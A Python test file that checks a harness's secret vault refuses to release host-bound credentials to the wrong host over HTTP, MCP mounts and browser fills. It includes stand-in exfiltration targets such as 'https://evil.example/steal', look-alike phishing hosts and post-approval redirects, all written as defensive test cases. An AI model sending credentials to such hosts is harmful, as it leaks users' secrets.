"""Per-secret host binding: a vault secret bound to hosts at config time can
never be injected toward any other host. The refusal is structural (in
`SecretSink.resolve`, before anything leaves the parent) — the approval prompt
is a confirmation, not the last line of defense."""

from __future__ import annotations

import pytest

from pyharness import Vault, Workspace
from pyharness.broker.capabilities import HttpSessionCapability
from pyharness.broker.capabilities.browser import BrowserCapability, _BrowserSession
from pyharness.security.sink import SecretSink
from pyharness.security.vault import EncryptedFile

BOUND = Vault({"gh": {"value": "S3CRET", "hosts": ["API.GitHub.com"]}, "free": "OPEN"})


class _FakeResp:
    def __init__(self, url):
        import datetime

        self.status_code = 200
        self.text = "ok"
        self.url = url
        self.content = b"ok"
        self.headers = {"content-type": "text/plain"}
        self.elapsed = datetime.timedelta(milliseconds=1)


class _FakeClient:
    instances: list = []

    def __init__(self, **kwargs):
        self.calls: list = []
        _FakeClient.instances.append(self)

    def request(self, method, url, **kwargs):
        self.calls.append({"method": method, "url": url, **kwargs})
        return _FakeResp(url)

    def close(self):
        pass


@pytest.fixture
def fake_httpx(monkeypatch):
    import httpx

    _FakeClient.instances = []
    monkeypatch.setattr(httpx, "Client", _FakeClient)
    return _FakeClient


def test_vault_entry_forms():
    # Dict entries carry hosts (normalized lowercase); bare strings are unbound.
    assert BOUND.get("gh") == "S3CRET"
    assert BOUND.hosts("gh") == ("api.github.com",)
    assert BOUND.get("free") == "OPEN"
    assert BOUND.hosts("free") is None
    # An empty host list folds to unbound rather than binding to nothing.
    assert Vault({"x": {"value": "v", "hosts": []}}).hosts("x") is None


def test_host_binding_stored_as_url_still_matches_the_page():
    # A binding pasted as a full URL (or host:port, or with a path) must reduce to
    # the same bare hostname every capability derives via urlsplit(url).hostname —
    # otherwise it can never match and the secret is unusable on its own site.
    from pyharness.security.vault import normalize_host

    assert normalize_host("https://app.capacities.io/") == "app.capacities.io"
    assert normalize_host("App.Capacities.IO/login") == "app.capacities.io"
    assert normalize_host("app.capacities.io:443") == "app.capacities.io"
    assert normalize_host("http://APP.capacities.io") == "app.capacities.io"
    assert normalize_host("app.capacities.io") == "app.capacities.io"
    assert normalize_host("  ") == ""

    # A vault whose binding was stored as a URL resolves toward the page host.
    v = Vault({"cap": {"value": "PW", "hosts": ["https://app.capacities.io/"]}})
    assert v.hosts("cap") == ("app.capacities.io",)
    sink = SecretSink(v)
    assert sink.resolve("cap", target_host="app.capacities.io") == "PW"
    with pytest.raises(PermissionError):
        sink.resolve("cap", target_host="evil.example")


def test_sink_enforces_host_binding():
    sink = SecretSink(BOUND)
    # Allowed host resolves (case-insensitive), and the cleartext is masked.
    assert sink.resolve("gh", target_host="API.github.COM") == "S3CRET"
    assert "***" in sink.redact("echo S3CRET")
    # Any other host — or no host at all — is refused before injection.
    with pytest.raises(PermissionError):
        sink.resolve("gh", target_host="api.github.com.evil.example")
    with pytest.raises(PermissionError):
        sink.resolve("gh")
    # Unbound secrets keep today's behavior: any (or no) target host.
    assert sink.resolve("free") == "OPEN"
    assert sink.resolve("free", target_host="anywhere.example") == "OPEN"


def test_http_request_refuses_bound_secret_to_wrong_host(tmp_path, fake_httpx):
    http = HttpSessionCapability(Workspace(tmp_path), vault=BOUND)
    with pytest.raises(PermissionError):
        http.request(None, "GET", "https://evil.example/steal", auth="gh")
    with pytest.raises(PermissionError):
        http.request(
            None,
            "POST",
            "https://evil.example/steal",
            json={},
            secret_fields={"t": "gh"},
        )
    # Refused before any client existed — nothing left the machine.
    assert not any(c.calls for c in fake_httpx.instances)
    result = http.request(None, "GET", "https://api.github.com/user", auth="gh")
    assert result["status"] == 200


def test_mcp_mount_binds_a_credential_to_the_server_url():
    """An MCP server's `secret:` refs resolve through the sink, so the binding
    holds there too: a remote server's URL host is the target, and a local
    (stdio) server has no host at all — a bound credential cannot be released
    into a subprocess env, since a binding it cannot describe cannot be
    honored."""
    from pyharness.tools.mcp.config import _resolve_secrets

    sink = SecretSink(BOUND)
    headers = {"Authorization": "secret:gh"}
    assert _resolve_secrets(headers, sink, "api.github.com") == {
        "Authorization": "S3CRET"
    }
    with pytest.raises(PermissionError, match="refusing to send it to"):
        _resolve_secrets(headers, sink, "mcp.evil.example")
    with pytest.raises(PermissionError, match="no target host"):
        _resolve_secrets({"GH_TOKEN": "secret:gh"}, sink, None)
    # An unbound credential still mounts on a local server, which is the
    # ordinary stdio case.
    assert _resolve_secrets({"K": "secret:free"}, sink, None) == {"K": "OPEN"}


def test_mcp_mount_derives_the_target_host_from_the_server_url(tmp_path):
    """End to end through `mount_config`: the host checked is the one taken
    from the declared server URL, so a bound credential reaches its own server
    and no other. Neither mount connects — both are lazy."""
    from pyharness import Registry
    from pyharness.tools.mcp import mount_config

    registry = Registry()
    sink = SecretSink(BOUND)
    spec = {"url": "https://api.github.com/mcp", "headers": {"A": "secret:gh"}}
    assert mount_config(registry, {"mcpServers": {"gh": spec}}, sink=sink) == ["gh"]
    evil = {**spec, "url": "https://mcp.evil.example/mcp"}
    with pytest.raises(PermissionError, match="refusing to send it to"):
        mount_config(registry, {"mcpServers": {"evil": evil}}, sink=sink)
    assert registry.info("evil") is None


def test_browser_fill_secret_checks_page_host(tmp_path):
    cap = BrowserCapability(Workspace(tmp_path), vault=BOUND)

    class _FakePage:
        url = "https://api.github.com.evil.example/login"
        filled: list = []

        def fill(self, target, value):
            self.filled.append((target, value))

    page = _FakePage()
    session = _BrowserSession(
        browser=None, context=None, page=page, sink=SecretSink(BOUND)
    )
    cap._sessions["sid"] = session
    with pytest.raises(PermissionError):
        cap.fill_secret("#password", "gh")
    with pytest.raises(PermissionError):
        cap.fill_totp("#otp", "gh")
    assert page.filled == []  # nothing was typed into the look-alike page
    page.url = "https://api.github.com/login"
    # The credential arg is `secret` (a vault name) — pin the keyword so the rename
    # from `secret_name` doesn't silently regress the model-facing signature.
    cap.fill_secret("#password", secret="gh")
    assert page.filled == [("#password", "S3CRET")]


class _MovingPage:
    """A page that can be navigated out from under a pending call — the shape a
    meta-refresh or a scripted `location` assignment produces."""

    def __init__(self, url: str):
        self.url = url
        self.filled: list[tuple[str, str]] = []

    def fill(self, target, value):
        self.filled.append((target, value))


def _pinned(cap: BrowserCapability, url: str, vault: Vault) -> _MovingPage:
    """A browser session on `url`, registered on `cap`."""
    page = _MovingPage(url)
    cap._sessions["sid"] = _BrowserSession(
        browser=None, context=None, page=page, sink=SecretSink(vault)
    )
    return page


def _vet(cap: BrowserCapability, op: str, *args, **kwargs) -> None:
    """The broker-side hooks that run before the human answers, in dispatch's
    order — `validate`, then `preview` (which is what builds the line the human
    reads). Calling them directly keeps the test about the capability's own
    plumbing; `evals/attacks/secrets.py` drives the same path through a real
    broker and a real approver."""
    cap.validate(op, args, kwargs)
    cap.preview(op, args, kwargs)


UNBOUND = Vault({"pw": "OPEN-SESAME"})


def test_unbound_fill_refuses_a_page_that_moved_after_approval(tmp_path):
    # The TOCTOU the host binding does not cover: an *unbound* secret approved
    # for one page, typed after the page redirected itself somewhere else.
    cap = BrowserCapability(Workspace(tmp_path), vault=UNBOUND)
    page = _pinned(cap, "https://bank.example/login", UNBOUND)
    _vet(cap, "fill_secret", "#password", "pw")
    page.url = "https://evil.example/collect"  # meta-refresh between the two
    with pytest.raises(PermissionError, match="moved from 'bank.example'"):
        cap.fill_secret("#password", "pw")
    assert page.filled == []  # nothing was typed


def test_unbound_totp_fill_refuses_a_page_that_moved_after_approval(tmp_path):
    seed = Vault({"otp": "JBSWY3DPEHPK3PXP"})
    cap = BrowserCapability(Workspace(tmp_path), vault=seed)
    page = _pinned(cap, "https://bank.example/2fa", seed)
    _vet(cap, "fill_totp", "#otp", "otp")
    page.url = "https://evil.example/collect"
    with pytest.raises(PermissionError, match="after this fill was approved"):
        cap.fill_totp("#otp", "otp")
    assert page.filled == []


def test_a_same_host_navigation_does_not_refuse_the_fill(tmp_path):
    # A login flow redirects within its own site all the time (/login ->
    # /login?step=2). Re-prompting on every path change is approval fatigue, so
    # the pin is on the host.
    cap = BrowserCapability(Workspace(tmp_path), vault=UNBOUND)
    page = _pinned(cap, "https://bank.example/login", UNBOUND)
    _vet(cap, "fill_secret", "#password", "pw")
    page.url = "https://bank.example/login?step=2"
    cap.fill_secret("#password", "pw")
    assert page.filled == [("#password", "OPEN-SESAME")]


def test_the_pin_authorizes_exactly_one_fill(tmp_path):
    # A second fill on the same approval would be a second credential release
    # off one sign-off, so the pin is consumed. What remains is the live page's
    # own host, which is all an unbrokered call ever had.
    cap = BrowserCapability(Workspace(tmp_path), vault=UNBOUND)
    page = _pinned(cap, "https://bank.example/login", UNBOUND)
    _vet(cap, "fill_secret", "#password", "pw")
    cap.fill_secret("#password", "pw")
    page.url = "https://evil.example/collect"
    cap.fill_secret("#password", "pw")  # no pin left: no approval to violate
    assert cap._sessions["sid"].pinned_host is None


def test_bound_fill_still_refuses_a_page_that_moved_after_approval(tmp_path):
    # Belt and braces: the binding refuses the wrong host on its own, and the
    # pin refuses it before the vault is even consulted.
    cap = BrowserCapability(Workspace(tmp_path), vault=BOUND)
    page = _pinned(cap, "https://api.github.com/login", BOUND)
    _vet(cap, "fill_secret", "#password", "gh")
    page.url = "https://api.github.com.evil.example/login"
    with pytest.raises(PermissionError, match="moved from 'api.github.com'"):
        cap.fill_secret("#password", "gh")
    assert page.filled == []


def test_cli_set_host_binds_and_list_shows_it(tmp_path, monkeypatch, capsys):
    from pyharness.cli import vault as cli_vault

    monkeypatch.setenv("PYHARNESS_VAULT_FILE", str(tmp_path / "secrets.enc"))
    monkeypatch.setenv("PYHARNESS_VAULT_PASSPHRASE", "pw")
    monkeypatch.setattr(
        "sys.argv",
        [
            "pyharness-vault",
            "set",
            "gh",
            "tok",
            "--host",
            "api.github.com",
            "--host",
            "uploads.github.com",
        ],
    )
    cli_vault.main()
    monkeypatch.setattr("sys.argv", ["pyharness-vault", "list"])
    cli_vault.main()
    out = capsys.readouterr().out
    assert "gh -> api.github.com, uploads.github.com" in out
    assert "tok" not in out  # never values
    # The stored entry round-trips into a Vault that enforces the binding.
    vault = Vault(file=EncryptedFile(tmp_path / "secrets.enc", "pw"))
    assert vault.hosts("gh") == ("api.github.com", "uploads.github.com")
    with pytest.raises(PermissionError):
        SecretSink(vault).resolve("gh", target_host="evil.example")


def test_cli_set_host_normalizes_a_pasted_url(tmp_path, monkeypatch, capsys):
    from pyharness.cli import vault as cli_vault

    monkeypatch.setenv("PYHARNESS_VAULT_FILE", str(tmp_path / "secrets.enc"))
    monkeypatch.setenv("PYHARNESS_VAULT_PASSPHRASE", "pw")
    monkeypatch.setattr(
        "sys.argv",
        [
            "pyharness-vault",
            "set",
            "cap",
            "tok",
            "--host",
            "https://app.capacities.io/",
        ],
    )
    cli_vault.main()
    out = capsys.readouterr().out
    assert "bound to app.capacities.io" in out  # stored canonical, not the URL
    vault = Vault(file=EncryptedFile(tmp_path / "secrets.enc", "pw"))
    assert vault.hosts("cap") == ("app.capacities.io",)
    # A --host with no recoverable hostname is rejected, not silently unbound.
    monkeypatch.setattr(
        "sys.argv", ["pyharness-vault", "set", "x", "v", "--host", "https:///"]
    )
    with pytest.raises(SystemExit):
        cli_vault.main()


def test_cli_set_rejects_bad_usage(tmp_path, monkeypatch):
    from pyharness.cli import vault as cli_vault

    monkeypatch.setenv("PYHARNESS_VAULT_FILE", str(tmp_path / "secrets.enc"))
    monkeypatch.setenv("PYHARNESS_VAULT_PASSPHRASE", "pw")
    for argv in (
        ["pyharness-vault", "set", "gh", "tok", "--host"],  # trailing flag, no value
        ["pyharness-vault", "set", "gh", "tok", "extra"],  # too many positionals
    ):
        monkeypatch.setattr("sys.argv", argv)
        with pytest.raises(SystemExit):
            cli_vault.main()
